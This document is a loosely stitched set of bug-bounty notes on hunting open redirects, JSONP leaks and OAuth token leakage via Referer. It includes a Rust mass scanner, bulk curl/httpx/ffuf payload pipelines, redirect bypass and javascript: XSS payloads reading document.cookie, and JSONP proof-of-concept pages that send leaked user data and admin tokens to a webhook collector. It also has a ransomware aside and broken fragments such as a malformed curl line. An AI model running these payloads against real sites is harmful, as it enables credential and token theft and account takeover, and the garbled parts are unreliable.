
_Ps: You can chain OR with SSRF_

---

generate the poc for cors-miss endpoint https://vral-parmar.github.io/CORS-POC-Generator

http://GitBook_s.t.me

---

🤒Fixed Mindset Hunters: Such a big company, already tested by many good hunters, I won't find any. Also they have internal pentesters , auditors, they have senior developers who practice secure coding as well. DevOps and DevSecOps and what not……It's secure mostly, let's find an easy program.

😈Growth Mindset Hunters: A big company implies a larger attack surface, and developers keep changing the codebase every now and then raising the possibility of finding bugs again and again. After fixing the bug also there is another test case to hunt for bypass of the fix.

> **ccTLD 🔍**

It stands for country code top-level domain.

```bash
site:philips.* -site:philips.com
```

_Google is a very powerful weapon in the hands of dedicated manual dorkers!_


![None](https://miro.medium.com/v2/resize:fit:700/1*ihU-Da9vDY3hwkQIiid84A.png)

Here, let's say the `philips.to` is repeating again and again, so now we perform negative filtering and find other ccTLDs.

**Negative filtering:** excluding specific results from your search query using the `-` (minus) operator.

```bash
site:philips.* -site:philips.com -site:philips.to
```

![None](https://miro.medium.com/v2/resize:fit:700/1*RV8jz7Ex-O6827mz86ceeQ.png)

Link Grabber Extension

![None](https://miro.medium.com/v2/resize:fit:700/1*LSv3oMd_ZkDdFZy351JkHg.png)

![None](https://miro.medium.com/v2/resize:fit:700/1*WXYOP8d7DstlCh3GmF4mmQ.png)

#### Find more and more subdomains

```bash
site:*.domain.tld
site:*-*.domain.tld
site:*-*.*.domain.tld
site:*-*.*.*.domain.tld
site:*-*-*.*.*.domain.tld

#keep using hyphen and find more and more assets
```

_⛏️Katana Crawling (Active Method)_

```cpp
katana -u philips.cctld -jc -d 5 -o katana_urls.txt
```

_🔨Waymore Archived URLs (Passive Method)_

```css
waymore -i philips.any_cctld -mode U -oU waymore_philips.txt
```

Now , first test case for Open Redirect is finding "=http" and then replacing it with any site like `evil.com`

```bash
cat katana_urls.txt | grep "=http" | sort -u | uro > openredirect_test1.txt
cat waymore_philips.txt | grep "=http" | sort -u | uro > openredirect_test2.txt
```

Now, you can proceed in many ways to test for the basic Open Redirect.

**1️⃣ Nuclei Method**

```bash
nuclei -l openredirect_testurls.txt -tags redirect
```

Just by mentioning `-tags` option with value `redirect` , nuclei will find all templates related to Open Redirect vulnerability and test automatically.

**2️⃣ Manual Method**

Open each URL one by one, and replace it with evil.com

But I don't like to test manually at least for this tiny task when automation can handle it easily.

Original:

```bash
https://domain.com/path1/path2/any.php?url=https://sub1.domain.com
```

Replace with `evil.com`

```bash
https://domain.com/path1/path2/any.php?url=https://evil.com
```

**3️⃣ Custom Script**

_Nowadays with the help of ChatGPT, you can create anything you like in few minutes. Just you need to solve errors, debug few basic and that's it. No need to code line by line. Instead focus on adding more logic, pattern matching, and adding edge cases which by default the free version won't do as per basic prompts.

**I made a Rust script with the help of ChatGPT and reported many through OBB.**

On evil.com , we host our undetected malware with ransomware capabilities , if anyone makes a GET request to [http://evil.com,](http://evil.com,) initiate the steps that the malware developer has designed for.

#### Custom Google Dorks only for OpenRedirect🦀

```bash
site:domain.com inurl:keyword1here inurl:keyword2here .......

Make your own custom dorks using combinations of keywords below

🤑Keywords for OpenRedirect Urls
#set1
redir
redirect
redirect_uri
redirect_url
uri
url
next
out
to
forward
view

#set2
oauth
auth
client
response
code
sso
authorize
token
secret
type

#set3
v1
v2
v3
v4
2F (2F means /)
3A (3A means :)

http:// ->  http3A2F2F😎

#set4
login
identity
iam
oidc
saml
```

#### Open Redirect Rust Scanner Basic Logic💡

#Mass_OpenRedirect

_The main logic is the just the basic thing to find all parameter values that starts with "=http" and replace with "=http://evil.com" and match specific strings within the response body that implies that it is definitely evil.com only.


script blog by: https://freedium.cfd/https://osintteam.blog/20-open-redirect-bugs-in-few-minutes-c9fdabf75642

### RUST SCANNER🦀

![None](https://miro.medium.com/v2/resize:fit:700/1*zBVpozuT-L_zWW6uM8VyyQ.png)

![None](https://miro.medium.com/v2/resize:fit:700/1*kcaarKkyfl0C2Ecbwj8cAA.png)

```rust
use std::fs::File;
use std::io::{self, BufRead, BufReader};
use reqwest::blocking::Client;
use colored::*;
use std::collections::HashSet;
use url::Url;

fn replace_http_parameters(url: &str, payload: &str) -> String {
    if let Ok(mut parsed_url) = Url::parse(url) {
        let modified_query: Vec<(String, String)> = parsed_url
            .query_pairs()
            .map(|(key, value)| {
                if value.starts_with("http") {
                    (key.to_string(), payload.to_string())
                } else {
                    (key.to_string(), value.to_string())
                }
            })
            .collect();
        parsed_url.query_pairs_mut().clear().extend_pairs(modified_query);
        return parsed_url.to_string();
    }
    url.to_string()
}

fn is_valid_url(url: &str) -> bool {
    match Url::parse(url) {
        Ok(parsed_url) => parsed_url.scheme() == "http" || parsed_url.scheme() == "https",
        Err(_) => false,
    }
}

fn main() -> io::Result<()> {
    println!("{}","                                                                                                                                                                                                                                                                                         
                             ..................=------=====------:.......         :+-     
                        :+********+++++=---====+*****#*+=++++=++**++++=+*-        --:     
                     ..-######**********===--=++***++++***++***+**++++++***+++++++***=    
 .----==+++****+++*****############**##**********#**+++++++======.......:..........:      
 =#***************#****++#####*++---*###****-.....::.                                     
  ##*******#####*+=-:.   +****=:.   +*+###*#+                                             
  +######**+=-:.         +**+:  .     .####*#=                                            
  .#*+=:.               =***-          :####*#+                                           
                        .*#*=            :####*#*-                                        
                        .-=:             .*###**#*-                                       
                                           -######+                                       
                                             -*##-                                        
                                                .      
       Version: 1.0                                   
                                                                                          
    ".red());

    println!("{}","Script by LegionHunter".bright_red());
    println!("Enter the filename containing the list of URLs:");
    let mut filename = String::new();
    io::stdin().read_line(&mut filename)?;
    let filename = filename.trim();

    let file = File::open(filename)?;
    let reader = BufReader::new(file);
    let urls: Vec<String> = reader.lines().filter_map(|line| line.ok()).collect();

    let payload = "http://evil.com"; 
    let client = Client::new();
    let mut tested_urls = HashSet::new();

    for url in urls {
        let modified_url = replace_http_parameters(&url, payload);

        if tested_urls.contains(&modified_url) {
            continue;         }

        if !is_valid_url(&modified_url) {
            println!("Skipping unsupported URL scheme for: {}", modified_url);
            continue;
        }

        match client.get(&modified_url).send() {
            Ok(response) => {
                let status = response.status();

                if status.is_redirection() {
                    if let Some(location) = response.headers().get("Location") {
                        let location_str = location.to_str().unwrap_or("");
                        if location_str == payload {
                            println!("{} {}", "Open Redirect Found:".red(), modified_url);
                        } else {
                            println!("{} {}: {}", "Redirect to different location for".red(), modified_url, location_str);
                        }
                    } else {
                        println!("{} {}", "Redirection status but no Location header for".red(), modified_url);
                    }
                } else {
                    let body = response.text().unwrap_or_else(|_| String::from(""));
                    if body.contains("The fake ones are the ones that scream the most") {
                        println!("{} {}", "Open Redirect Found in response body:".red(), modified_url);
                    } else {
                        println!("{} {}: Status {}", "No redirect for".green(), modified_url, status);
                    }
                }
            }
            Err(e) => eprintln!("Failed to send request to {}: {}", modified_url, e),
        }

        tested_urls.insert(modified_url); 
    }

    Ok(())
}

```

Cargo.toml

```makefile
.
.
.
.

[dependencies]
reqwest = { version = "0.11", features = ["blocking"] }  
colored = "2.0"                                         
url = "2.2"         
```

![None](https://miro.medium.com/v2/resize:fit:700/1*X17lKbkqJrS3S2q8JpwPig.png)

> Ideas about next version 2.0

_Next version , I am planning to add more complex payloads to confuse the backend how to process our malicious input, more advanced programming & scripting stuff like asynchronous model , receiving quick and instant alerts on slack, telegram, gmail while you enjoy your day with other juicy bugs or system toast notification if you are on your PC 24x7

Credit: dwisiswant0

```bash
export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

Credit: N3T_hunt3r

```bash
cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
```

_**Impact**_ Attackers exploit open redirects to add credibility to their phishing attacks. Most users see the legitimate, trusted domain, but do not notice the redirection to the phishing site, it can also lead to the forceful installation of undetectable malware starting with the dropper initial part.

_**Severity: Low/Medium**_

_**Vulnerable URL**_

```bash
https://sub1.sub2.philips.ccTLD/path1/path2?param1=value1&redirectParameter=.....
```

_**POC URL**_

```bash
https://sub1.sub2.philips.ccTLD/path1/path2?param1=value1&redirectParameter=https://evil.com
```

_**Vulnerability Reference**_

[1](https://cwe.mitre.org/data/definitions/601.html)

[2](https://brightsec.com/blog/open-redirect-vulnerabilities/)

_**Mitigation**_ Ask the web developer to validate, check, and sanitize user inputs for the parameter "{param here}"

---
## Hunting High-Paying Open Redirect Bugs in Web Apps

by: [coffinxp](https://infosecwriteups.com/from-zero-to-hero-hunting-high-paying-open-redirect-bugs-in-web-apps-fdb80286236e)


# **Introduction**

Open Redirect vulnerability is a common security flaw that allows attackers to redirect users to malicious websites. This vulnerability occurs when a web application accepts user input for URLs without proper validation or control. As simple as it sounds this flaw can lead to serious consequences like phishing, malware distribution and session hijacking.

## **Understanding Open Redirect Basics**

If the server blindly accepts the user supplied URL and redirects without checks it becomes an open redirect vulnerability. By modifying the url parameter attackers can trick users into visiting harmful sites like this:

https://example.com/redirect?url=http://malicious.com

In this scenario the attacker manipulates the URL parameter to redirect the user to a malicious site under their controlled domain.

# **Manual Testing Techniques**

**1. Simply Change the Domain**

```bash
?redirect=https://example.com → ?redirect=https://evil.com
```

**2. Bypass When Protocol is Blacklisted**

```
?redirect=https://example.com → ?redirect=//evil.com
```

**3. Bypass When Double Slash is Blacklisted**

```
?redirect=https://example.com → ?redirect=\\evil.com
```

**4. Bypass Using http: or https:**

```
?redirect=https://example.com → ?redirect=https:example.com
```

**5. Bypass Using %40 (At Symbol Encoding)**

```
?redirect=example.com → ?redirect=example.com%40evil.com
```

**6. Bypass if Only Checking for Domain Name**

```
?redirect=example.com → ?redirect=example.comevil.com
```

**7. Bypass Using Dot Encoding %2e**

```
?redirect=example.com → ?redirect=example.com%2eevil.com
```

**8. Bypass Using a Question Mark**

```
?redirect=example.com → ?redirect=evil.com?example.com
```

**9. Bypass Using Hash %23**

```
?redirect=example.com → ?redirect=evil.com%23example.com
```

**10. Bypass Using a Symbol**

```
?redirect=example.com → ?redirect=example.com/evil.com
```

**11. Bypass Using URL Encoded Chinese Dot %E3%80%82**

```bash
?redirect=example.com → ?redirect=evil.com%E3%80%82%23example.com
```

**12. Bypass Using a Null Byte %0d or %0a**

```
?redirect=/ → ?redirect=/%0d/evil.com
```

13. Encoded URL Redirects

```
https://example.com/redirect?url=http%3A%2F%2Fmalicious.com
```

14. Path-Based Redirects

```
https://example.com/redirect/http://malicious.com
```

15. Data URI Redirects

```
https://example.com/redirect?url=data:text/html;

base64,

PHNjcmlwdD5hbGVydCgnVGhpcyBpcyBhbiBhdHRhY2snKTwvc2NyaXB0Pg==
```

16. JavaScript Scheme Redirects

```
https://example.com/redirect?url=javascript:alert('XSS');//
```

17. Open Redirect via HTTP Header

```bash
Location: http://malicious.com 
X-Forwarded-Host: evil.com Refresh: 0; 
url=http://malicious.com
```

18. **Path Traversal Hybrids**

```
/redirect?url=/../../https://evil.com
```

19. **Using svg paylaod**

```html
<?xml version="1.0" encoding="UTF-8" standalone="yes"?> 
<svg onload="window.location='https://evil.com/'" xmlns="http://www.w3.org/2000/svg"></svg>
```

### **Automated Tools for Scanning**

#### Reconnaissance

Collect multiple active and passive URLs from all available tools and sources.

> **For single domain:**

```bash
echo target.com | gau --o urls1.txt echo target.com | katana -d 2 -o urls2.txt 

echo target.com | urlfinder -o urls3.txt echo target.com | hakrawler > urls4.txt
```

> **For multiple subdomains:**

```bash
subfinder -d target.com -all -o subdomains1.txt 
assetfinder --subs-only target.com > subdomains2.txt 
sort -u subdomains.txt subdomains2.txt -o uniqsubs.txt 
cat uniqsubs.txt | httpx-toolkit -o finallist.txt  

cat finallist.txt | gau --o urls1.txt
cat finallist.txt | katana -d 2 -o urls2.txt 
cat finallist.txt | urlfinder -o urls3.txt 
cat finallist.txt | hakrawler > urls4.txt
```

After collecting all the URLs its time to filter out duplicates and sort them.

```bash
cat urls1.txt urls2.txt urls3.txt | uro | sort -u | tee final.txt
```

#### Filtering URLs for Redirect Parameters

Using the grep command to filter out all open redirect parameters used for redirections:

```bash
cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt
```

A more effective approach is to use the gf tool pattern to filter only open redirect parameters with the following command:

```bash
final.txt | gf redirect | uro | sort -u | tee redirect_params.txt
```

> https://github.com/coffinxp/GFpattren/blob/main/redirect.json


Now its time for the final exploitation phase. Lets identify potential payloads and test for successful redirections

```bash
cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"`
```

Or you can also achieve same using the following method:

```bash
subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
```

![None](https://miro.medium.com/v2/resize:fit:700/1*h7GU2e5ZRyWhxcRWvKZVlQ.jpeg)

It will display all the URLs that redirect to evil.com on the screen.

To scan for all open redirect bypass payloads from my custom list use the following command:

```bash
cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
```

![None](https://miro.medium.com/v2/resize:fit:700/1*8PLeDM1E4ODcnFEI41N2hA.jpeg)

This command will test all the custom open redirect bypass payloads from coffinxp or.txt list against each URL parameter. If any redirection to Google is detected in the response it will be displayed on the screen.

Or you can also achieve same results using the following method for single and multiple target domains:
```bash
echo target.com -all | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com" subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
```

### Fuzzing with FFuF and Verifying in Burpsuite

```bash
ffuf -w redirect_params.txt:PARAM -w loxs/payloads/or.txt:PAYLOAD -u "https://site.com/bitrix/redirect.php?PARAM=PAYLOAD" -mc 301,302,303,307,308 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" -x http://localip:8080 -t 10 -mr "Location: http://google.com"
```

- -mc : Match only 301,302,303,307,308 redirect responses.
- -mr : Confirm redirect to a malicious domain "Location: http://google.com"
- -x: This option is used to proxy FFUF traffic through Burp Suite for manual testing.
- -w for wordlist: redirect_param.txt contains all openredirect params and or.txt file contains all openredirect bypass paylaods

![None](https://miro.medium.com/v2/resize:fit:700/1*DL8EFm9zDntIGcTjjRi9UA.jpeg)

After capturing FFUF traffic in Burp Suite, you can use the filter option to display only the 300 series status codes.

for more better filtering you can use burp search option to check only google.com url in response header for more acurate results:

![None](https://miro.medium.com/v2/resize:fit:700/1*o-3jN8EqckkOnYh774o-hA.jpeg)

You can also use CURL tool for mass open redirect testing with the following command:

```bash
cat urls.txt | qsreplace "https://evil.com" | xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\n" {}
```

![None](https://miro.medium.com/v2/resize:fit:700/1*CQ7Cypbl9UcntppsPodAPw.jpeg)

### Testing Using Nuclei Template

You can also use this custom private Nuclei template that automatically appends parameters to subdomain URLs and checks for open redirects.

```bash
echo subdomains.txt | nuclei -t openRedirect.yaml -c 30
```

![None](https://miro.medium.com/v2/resize:fit:700/1*p4FlqrzI4yAN-3BVgAa4zg.jpeg)

### Using virustotal

You can also use VirusTotal to find URLs with open redirect parameters and test them with the above methods.

```bash
https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=target.com
```

![None](https://miro.medium.com/v2/resize:fit:700/1*YRW6kUmPSTNZcFCrCwci7Q.jpeg)

```bash
./virustotal.sh domains.txt | gf redirect
```

![None](https://miro.medium.com/v2/resize:fit:700/1*15pW96Ev7t7mA395aWAU3Q.jpeg)

After this you can use the same methods like qsreplace,ffuf,httpx and Burp Suite for further testing.
### Using Burpsuite

You can also use Burp Suite to find open redirect vulnerabilities with the following methods:

> **step 1**

Intercept the target response in Burp Suite and send it to "Discover Content" for active crawling on the target domain.

![None](https://miro.medium.com/v2/resize:fit:700/1*I8e_Hdjc25zb0Nbk66fYCw.jpeg)

> **step 2**

After crawling you'll find numerous URLs with parameters in the Target tab.

![None](https://miro.medium.com/v2/resize:fit:700/1*99ElOranhaJYC3UJYnjbnQ.jpeg)

> **step 3**

After this filter all the responses to only 300-series status codes, pick one redirect parameter and send it to the Repeater tab.

![None](https://miro.medium.com/v2/resize:fit:700/1*qNES34SAg_wjkeyzWZ-c8g.jpeg)

> **step 4**

And now add the parameter position where you want to fuzz all open redirect bypass payloads. You can find the list in coffinxp GitHub repo:

> https://github.com/coffinxp/loxs/blob/main/payloads/or.txt

Now start the attack. Make sure auto URL encoding is disabled and you can add google.com or any site you want to check in Response Matching.

![None](https://miro.medium.com/v2/resize:fit:700/1*c3vEXwjQfANXIuESDJbM1w.jpeg)

> **step 5**

Now use the Filter option to view only 300-series status codes in the response. Here you'll find all the redirections on the target. Also make sure to check the response length for more accurate results.

![None](https://miro.medium.com/v2/resize:fit:700/1*Q1PmjUgDrxEyniQ66d5Nsg.jpeg)

Now you can copy any request and paste it into the browser to verify the redirection.

### Using Loxs tool

For a simpler way to find open redirects you can use our Loxs tool which automatically detects open redirects without any false positives. Use the following command first:

```bash
cat urls.txt | sed 's/=.*/=/' | uro >final.txt
```

- urls.txt: A file containing URLs that have been filtered and sorted using gf patterns or other methods.
- The sed command is used to extract all parameters from URLs and convert them into empty parameters for fuzzing.

After this send the final.txt file into the Loxs tool, select the open redirect option, choose the urls.txt file and select the payload file after that The result will look like this:

![None](https://miro.medium.com/v2/resize:fit:700/1*znCcpyuE4JPeV9Id6UW5Sw.jpeg)

And Loxs will also generate an HTML file for easy viewing of the results, showing all the successful open redirect payloads in a clean and organized format.

![None](https://miro.medium.com/v2/resize:fit:700/1*Ku_On8BYqUppcG88uTqAjQ.jpeg)

### Openredirect to XSS(ATO)

If you find any open redirect, always try to increase the impact by chaining it with XSS by using following paylaods:

```js
#Basic payload, javascript code is executed after "javascript:" 

javascript:alert(1) 

#Bypass "javascript" word filter with CRLF 

java%0d%0ascript%0d%0a:alert(0) 

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed 
#This bypasses FILTER_VALIDATE_URL os PHP 

javascript://%250Aalert(1) 

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator) 

javascript://%250Aalert(1)//?1 javascript://%250A1?alert(1):0 

#Others

%09Jav%09ascript:alert(document.domain) javascript://%250Alert(document.location=document.cookie) /%09/javascript:alert(1); /%09/javascript:alert(1) //%5cjavascript:alert(1); //%5cjavascript:alert(1) /%5cjavascript:alert(1); /%5cjavascript:alert(1) javascript://%0aalert(1) <>javascript:alert(1); //javascript:alert(1); //javascript:alert(1) /javascript:alert(1); /javascript:alert(1) \j\av\a\s\cr\i\pt\:\a\l\ert\(1\) javascript:alert(1); javascript:alert(1) javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie) javascript:confirm(1) javascript://https://whitelisted.com/?z=%0Aalert(1) javascript:prompt(1) jaVAscript://whitelisted.com//%0d%0aalert(1);// javascript://whitelisted.com?%a0alert%281%29 /x:1/:///%01javascript:alert(document.cookie)/
```

### Lab: Stealing OAuth access tokens via an open redirect | Web Security Academy

 _[This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth…](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)_

### Google Dorking & Automation

You can also use the manual method to find open redirects on your target using this Google Dork:

```json
site:target (inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= | inurl:dest= | inurl:target= | inurl:redirect_uri= | inurl:redirect_url= | inurl:checkout_url= | inurl:continue= | inurl:return_path= | inurl:returnTo= | inurl:out= | inurl:go= | inurl:login?to= | inurl:origin= | inurl:callback_url= | inurl:jump= | inurl:action_url= | inurl:forward= | inurl:src= | inurl:http | inurl:&) 

inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:target
```


For mass open redirect automation, you can use coffinxp **dorking.py script**, which fetches all Google Dork results within seconds on the terminal

![None](https://miro.medium.com/v2/resize:fit:700/1*5dlO88wtSQ30YqnQt5Kfxg.jpeg)

After this use gf patterns,qsreplace and httpx grep to filter valid open redirects with the following command:


```bash
cat urls.txt| gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
```

![None](https://miro.medium.com/v2/resize:fit:700/1*2rdI8gPFjWf-q2ZgrJI1SQ.jpeg)

For testing more advanced bypass payloads rather than simple ones use this command to try all bypass payloads from my custom wordlist:

```bash
cat urls.txt| gf redirect | uro | while read url; do cat /home/coffinxp/loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
```
### **Risks and Impacts**

- **Phishing Attacks**: Users are tricked into entering credentials on fake websites.
- **Malware Distribution**: Redirecting to sites that automatically download malware.
- **Session Hijacking**: Stealing session cookies through crafted URLs.

### How to Prevent

Here's how you can secure your website from open redirects:

- **Whitelist URLs**: Restrict redirection to trusted domains only.
- **Use Relative Paths:** Ditch full URLs for safer relative paths.
- **Validate Inputs**: Block any unknown or suspicious redirect values.
- **Show Warnings**: Notify users before redirecting them to external websites.

### 💵 Bug Bounty Payouts

- **Small Websites**: $50 — $200
- **Mid-Sized Companies**: $200 — $500
- **Big Corporations:** $500 — $1000
- **Open Redirect to ATO** $1000 — $5000


----

## How JSONP Exposure Led to Sensitive Data Leakage

by iski: https://infosecwriteups.com/jsonpocalypse-now-how-jsonp-exposure-led-to-sensitive-data-leakage-987b0e2718a8

i found this endpoint: 

```
https://data-api.target.com/getData?callback=foo
```

The `**callback**` parameter wasn’t just echoing back JSON. It was wrapping it in a function—hello, **JSONP!**

### 🧪 Phase 2: JSONP, The Forgotten Danger 👻

**What’s JSONP?**  
JavaScript-based endpoints using the `callback` parameter to wrap JSON responses in function calls to bypass CORS

JSONP = JSONPARSING

I tested it manually in the browser console:

```html
<script src="https://data-api.target.com/getData?callback=evilFunc"></script>
```

```html
<script>  
function evilFunc(data) {  
console.log("Leaked data:", data);  
}  
</script>
```

 _internal user profile data was logged to my console. Full names, emails, billing info… all without authentication!

The server might respond with:

```js
myFunction({ name: "Andrea", city: "Lonigo" });
```

To weaponize this, I made a simple proof-of-concept HTML file:

```html
<html>
  <head><title>JSONP Leaker</title></head>
  <body>
    <script>
      function leak(data) {
        fetch("https://webhook.site/YOUR-UNIQUE-ID", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
      }
    </script>
    <script src="https://data-api.target.com/getData?callback=leak"></script>
  </body>
</html>

```

**Hosted it on a controlled domain and sent it to myself to verify. The data got exfiltrated cleanly to my webhook. 🎯**

### 🚨 What Made This High Severity?

Most JSONP bugs are just “meh” unless they leak public data. But in this case:

- It exposed **authenticated user details** without a session
- CORS was **misconfigured** (it allowed `*` with `Access-Control-Allow-Credentials: true`)
- It was tied to production data. No masking, no redactions. Just raw juicy info 🥩

# 📦 Bonus: Internal JSONP on Admin Panel?

Now here’s the spicy part. During recon, I also found an **internal-use-only** endpoint:

#cURL

https://admin-api.target.com/internal/config?callback=handler

I spoofed the Origin header using curl:

```http
"Origin: evil.com" "https://admin-api.target.com/internal/config?callback=evil"
```

Guess what? It responded with:

```http
evil({"admin_token":"sk-very-secret-admin-token","env":"production"});
```

I had access to **admin-level tokens**. This wasn’t just a leak. This was:

💣 **FULL ACCOUNT TAKEOVER POTENTIAL**

**PoC: Hosted version**

```html
<html>
  <body>
    <script>
      function dump(d) {
        fetch("https://webhook.site/YOUR-ID", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(d)
        });
      }
    </script>
    <script src="https://data-api.target.com/getData?callback=dump"></script>
  </body>
</html>
```

**cURL for CORS Misconfig Detection:**

```http
curl -i -H "Origin: https://evil.com" \
     -H "Cookie: session=validuser" \
     "https://data-api.target.com/getData?callback=evil"
```

**Expected Response:**

Status: 200

Headers:

- `Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true Content-Type: application/javascript`

# 🧠 Lessons Learned (With Pain)

- JSONP is still alive and dangerous
- Always check **callback**, **cb**, **jsonp**, **function**, etc. in parameters
- CORS misconfigs make things way worse
- Don’t ignore boring-looking subdomains. That `data-api` one paid me.

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 

# Open Redirect + Referer Header = $3,000 Access Token Leak by Monika Sharma

### A clever exploitation of open redirect and Referer headers in PlayStation's OAuth flow.


!  To replicate this vulnerability you need:  

- **Find an open redirect vulnerability.**

-  **Find a Token in the URL** (and hope is vulnerable too)

-  **browser has to  sends the full Referer Header for the Token Leakage**

-  The application has to accept this kind of url for the exploitation: 
	https://my.playstation.com/login/oauth?redirect_uri=


> **TL;DR Summary**

- Target: my.playstation.com
- Core Issue: Access token sent in Referer header during OAuth callback
- Exploit Chain:

1. Abuse docs.playstation.com for open redirection
2. Trick the OAuth flow into redirecting to a malicious endpoint
3. Leak the access token via the Referer header

- Reward: $3,000 bounty
- Category: Token Smuggling via Referer + Open Redirect

> **Step-by-Step Breakdown**

Step 1. Identify an Open Redirect

- The researcher began by testing PlayStation-owned domains for open redirects. They found this:

```bash
https://docs.playstation.com/redirect/?target=https://evil.com
```

It correctly redirected to [https://evil.com](https://evil.com). That's a red flag — open redirects are often downplayed unless you can chain them with sensitive flows.

Step 2. Find a Token in the URL

- Next, they explored the OAuth flow on my.playstation.com. After login, the site redirected back with an access token in the URL:

```perl
https://my.playstation.com/?access_token=XYZ123&state=abc
```

That access_token=XYZ123 was visible in the URL, which means it could be leaked via the **Referer header** if this page redirected the browser somewhere else.


Step 3. Smuggle the Token via Referer

- Here's where it gets clever.
- If my.playstation.com was redirected to a domain the researcher controlled, and if the browser sends the full Referer, **the researcher would get the whole URL** — including the token.

So they crafted this redirect chain:

```ruby
https://my.playstation.com/login/oauth?redirect_uri=https://docs.playstation.com/redirect/?target=https://evil.com
```

- Browser redirects to docs.playstation.com, which redirects to evil.com
- The Referer header sent to evil.com is:

```perl
Referer: https://my.playstation.com/?access_token=XYZ123&state=abc
```

- Boom. Access token leaked.

> **Key Takeaways**

1. Low → High Impact Chains

Open redirects are usually dismissed as low-risk. But when chained with OAuth flows that return tokens in the URL, they become powerful.

2. Referer Header is Still Dangerous

In modern browsers, Referer stripping depends on the referrer-policy. But many sites still leak sensitive data via Referer. Check OAuth flows and how redirects are handled.

3. Audit OAuth Redirects Rigorously

Look at any redirect_uri handling and see whether they allow indirect hops (e.g., through other PlayStation domains). Many sites whitelist domains without verifying the final destination.

> **How You Can Find Similar Bugs**

Here's a quick checklist for replicating this technique:

- Scan for open redirects on all subdomains
- Trace OAuth/login flows — look for tokens in the URL
- Observe redirect behavior — is Referer passed to the next site?
- Test redirect chains using intermediary subdomains
- Look for referrer-policy: no-referrer or same-origin headers — lack of these means token might leak

Credit

- Hunter: [nnez](https://hackerone.com/nnez)
- Report ID: [835437](https://hackerone.com/reports/835437)


Testing Referer Header Leakage Methods  --- by deepseek:

To verify if a website passes the Referer header (and potentially leaks sensitive data like tokens), here's a methodology you can follow:

## Manual Testing Approach

1. **Set up a test environment**:
    
    - Use a web server you control (like ngrok, Burp Collaborator, or a simple Python HTTP server)
        
    - Have a way to inspect incoming requests (Burp Suite, Wireshark, or server logs)

**Test for Referer leakage**:

```
https://target-site.com/any-page?test=123
```

Then click any link to your server and check if the Referer header contains the full URL with parameters

Example: In `https://example.com/login?token=abc123&user=admin`, the parameters are `token=abc123` and `user=admin`


# How to Use the Python Referer Header Detection Script

Here's a step-by-step guide to using the Python script I provided to check for Referer header leakage:

## 1. Save the Script

Create a file named `referer_server.py` and paste the script:

```python
import http.server
import socketserver

class RefererHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        referer = self.headers.get('Referer', 'No Referer header')
        print(f"Referer: {referer}")
        self.send_response(200)
        self.end_headers()

with socketserver.TCPServer(("", 8000), RefererHandler) as httpd:
    print("Server started at http://localhost:8000")
    httpd.serve_forever()
```

## 2. Run the Script

Open a terminal and execute:

```python
python3 referer_server.py
```

You should see:

```bash
Server started at http://localhost:8000
```

## 3. Test the Server

While the server is running, you can test it in several ways:

### Method A: Browser Test

1. Open a browser and visit any website (like `example.com`)
    
2. Then visit `http://localhost:8000`
    
3. Check your terminal - it should show the Referer header from the previous site
    

### Method B: Curl Test

```bash
curl -H "Referer: https://test.com/somepage" http://localhost:8000
```